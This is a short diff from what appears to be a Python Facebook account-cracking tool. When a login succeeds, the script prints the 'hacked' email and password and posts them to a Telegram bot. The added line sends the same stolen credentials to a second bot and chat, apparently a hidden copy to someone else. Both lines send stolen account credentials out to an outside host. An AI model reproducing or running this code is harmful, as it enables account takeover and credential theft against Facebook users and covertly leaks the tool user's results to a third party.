@@ -158,6 +158,7 @@ elif choice == 2:
                 print("- Good Login [ ID : " + emili + " | username : " + random.choice(psw) + " ]")
                 print(f'{G}Hacked ==> {emili} | {random.choice(psw)}')
                 post(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text=تم صيد حساب فيسبوك\n{emili}:{random.choice(psw)} \n @maho_s9')
+                post(f'https://api.telegram.org/bot{cp}/sendMessage?chat_id={ok}&text=تم صيد حساب فيسبوك\n{emili}:{random.choice(psw)} \n@maho_s9')
 
             elif "checkpoint" in lo:
                 print("- CheckPoint [ ID : " + emili + " | username : " + random.choice(psw) + " ]")
